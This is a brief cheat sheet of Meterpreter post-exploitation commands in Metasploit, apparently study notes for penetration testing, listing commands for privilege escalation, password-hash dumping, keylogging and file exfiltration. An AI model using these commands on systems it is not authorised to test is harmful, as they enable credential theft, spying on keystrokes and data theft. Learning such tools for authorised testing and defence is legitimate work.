# Metasploit Post-Exploitation (Meterpreter)

Essential commands to execute once a Meterpreter session is established.

## Core System Commands
* `sysinfo`      - View target OS details and computer name.
* `getuid`       - Check current user privileges (e.g., SYSTEM, Administrator, local user).
* `getsystem`    - Attempt automatic privilege escalation to SYSTEM level.
* `shell`        - Drop into a native system command prompt (CMD or Bash).

## Data Gathering & Exfiltration
* `hashdump`     - Dump local user account password hashes (requires elevated privileges).
* `keyscan_start` / `keyscan_dump` - Start and retrieve a live software keylogger session.
* `download <file_path>` - Exfiltrate a file from the target machine to your host.
* 
